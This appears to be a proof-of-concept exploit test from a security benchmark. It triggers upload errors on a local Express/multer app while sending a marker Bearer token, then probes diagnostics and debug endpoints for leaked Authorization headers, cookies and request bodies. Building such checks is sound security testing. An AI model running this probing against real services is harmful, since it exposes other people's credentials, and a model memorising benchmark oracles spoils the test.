"""PoC exploit: Error detail information disclosure via diagnostics endpoint (CWE-209).

After the 3-stage chain, the error handler stores full request headers
and body in the error log, accessible via GET /diagnostics/:requestId.
An attacker triggers an error while sending a secret Authorization header,
then retrieves the stored headers via the diagnostics endpoint.

Target: File Upload (express-multer) app.
"""

import json
import uuid

from mosaic.oracle.exploit import ExploitTest


class ErrorDetailLeakExploit(ExploitTest):
    """Error detail leak: Authorization headers exposed via diagnostics."""

    def __init__(self, base_url: str = "http://localhost:39122"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "fileupload_error_detail_leak"

    def setup(self) -> None:
        """No setup needed — this app has no auth system to seed."""

    def execute(self) -> tuple[bool, str]:
        """Trigger an error with auth header, check if diagnostics exposes it."""
        evidence_parts: list[str] = []
        vuln_found = False

        # Use a distinctive secret token for detection
        secret_marker = f"MOSAIC_SECRET_TOKEN_{uuid.uuid4().hex[:8]}"
        auth_header = f"Bearer {secret_marker}"

        # Step 1: Trigger an error while sending our secret Authorization header.
        # Strategy A: Upload a file with a rejected extension (.txt) to trigger
        # multer's fileFilter error, which goes through the centralized error handler.
        request_id = self._trigger_error_via_bad_extension(auth_header, evidence_parts)

        # Strategy B: If no request ID from extension rejection, try other error paths
        if not request_id:
            request_id = self._trigger_error_via_bad_request(auth_header, evidence_parts)

        # Strategy C: Try triggering via oversized upload
        if not request_id:
            request_id = self._trigger_error_via_oversize(auth_header, evidence_parts)

        if not request_id:
            evidence_parts.append("No X-Request-Id header in any error response")
            return False, (
                "Request ID middleware not implemented. "
                + " | ".join(evidence_parts)
            )

        evidence_parts.append(f"Got request ID: {request_id}")

        # Step 2: Query diagnostics endpoint to retrieve stored error
        vuln_found, diag_evidence = self._check_diagnostics(
            request_id, secret_marker, evidence_parts
        )

        if vuln_found:
            return True, (
                f"Error detail information disclosure confirmed (CWE-209). "
                f"GET /diagnostics/:requestId exposes full request "
                f"headers (including Authorization tokens) and body. "
                + " | ".join(evidence_parts)
            )

        return False, (
            f"Could not confirm information leak. "
            + " | ".join(evidence_parts)
        )

    def _trigger_error_via_bad_extension(
        self, auth_header: str, evidence_parts: list[str]
    ) -> str:
        """Upload a .txt file to trigger multer fileFilter rejection."""
        # Build minimal multipart upload with .txt extension (rejected by filter)
        resp = self.http_post(
            "/upload-avatar",
            files={"avatar": ("exploit.txt", b"not an image", "text/plain")},
            headers={"Authorization": auth_header},
        )

        request_id = resp.headers.get("X-Request-Id", "")
        # Also check lowercase variant
        if not request_id:
            request_id = resp.headers.get("x-request-id", "")

        if request_id:
            evidence_parts.append(
                f"Triggered error via .txt upload (HTTP {resp.status_code}), "
                f"got X-Request-Id"
            )
        else:
            evidence_parts.append(
                f"Bad extension upload returned HTTP {resp.status_code} but "
                f"no X-Request-Id header"
            )

        return request_id

    def _trigger_error_via_bad_request(
        self, auth_header: str, evidence_parts: list[str]
    ) -> str:
        """Send a malformed POST to trigger an error response."""
        # POST to /upload-avatar without multipart content type
        resp = self.http_post(
            "/upload-avatar",
            json={"not": "a file upload"},
            headers={"Authorization": auth_header},
        )

        request_id = resp.headers.get("X-Request-Id", "")
        if not request_id:
            request_id = resp.headers.get("x-request-id", "")

        if request_id:
            evidence_parts.append(
                f"Triggered error via malformed POST (HTTP {resp.status_code}), "
                f"got X-Request-Id"
            )
        return request_id

    def _trigger_error_via_oversize(
        self, auth_header: str, evidence_parts: list[str]
    ) -> str:
        """Upload an oversized file to trigger multer limit error."""
        # 3MB file exceeds the 2MB limit
        big_content = b"\x89PNG\r\n\x1a\n" + (b"\x00" * (3 * 1024 * 1024))
        resp = self.http_post(
            "/upload-avatar",
            files={"avatar": ("big.png", big_content, "image/png")},
            headers={"Authorization": auth_header},
        )

        request_id = resp.headers.get("X-Request-Id", "")
        if not request_id:
            request_id = resp.headers.get("x-request-id", "")

        if request_id:
            evidence_parts.append(
                f"Triggered error via oversize upload (HTTP {resp.status_code}), "
                f"got X-Request-Id"
            )
        return request_id

    def _check_diagnostics(
        self,
        request_id: str,
        secret_marker: str,
        evidence_parts: list[str],
    ) -> tuple[bool, str]:
        """Check if diagnostics endpoint exposes sensitive request data."""
        vuln_found = False

        # Try multiple possible diagnostics endpoint paths
        diag_paths = [
            f"/diagnostics/{request_id}",
            f"/v1/diagnostics/{request_id}",
            f"/debug/{request_id}",
            f"/errors/{request_id}",
            f"/v1/errors/{request_id}",
        ]

        resp = None
        for path in diag_paths:
            resp = self.http_get(path)
            if resp.ok:
                evidence_parts.append(f"Found diagnostics at {path}")
                break
            if resp.status_code != 404:
                evidence_parts.append(
                    f"{path} returned {resp.status_code}"
                )

        if resp is None or not resp.ok:
            evidence_parts.append("Diagnostics endpoint not available")
            return False, "no diagnostics"

        evidence_parts.append(f"Diagnostics returned HTTP {resp.status_code}")

        # Parse and inspect diagnostics response
        try:
            diag_data = resp.json()
            raw_text = resp.text

            # Check for headers field
            if "headers" in diag_data:
                evidence_parts.append("Diagnostics includes 'headers' field")
                headers = diag_data["headers"]
                if isinstance(headers, dict):
                    # Check if authorization header is present
                    auth_value = headers.get("authorization", "")
                    if secret_marker in str(auth_value):
                        evidence_parts.append(
                            "Authorization token LEAKED in diagnostics response"
                        )
                        vuln_found = True
                    elif auth_value:
                        evidence_parts.append(
                            f"Authorization header present: {auth_value[:40]}..."
                        )
                        vuln_found = True

                    # Check for other sensitive headers
                    if headers.get("cookie"):
                        evidence_parts.append("Cookie header also leaked")

            # Check for body field
            if "body" in diag_data:
                evidence_parts.append("Diagnostics includes 'body' field")
                vuln_found = True

            # String-level check for the secret marker
            if secret_marker in raw_text:
                evidence_parts.append(
                    "Secret token found in diagnostics response text"
                )
                vuln_found = True

            # Generic auth header leak detection
            if "authorization" in raw_text.lower() and "bearer" in raw_text.lower():
                evidence_parts.append(
                    "Authorization header visible in diagnostics"
                )
                vuln_found = True

        except Exception as e:
            evidence_parts.append(f"Could not parse diagnostics response: {e}")

        return vuln_found, "checked"
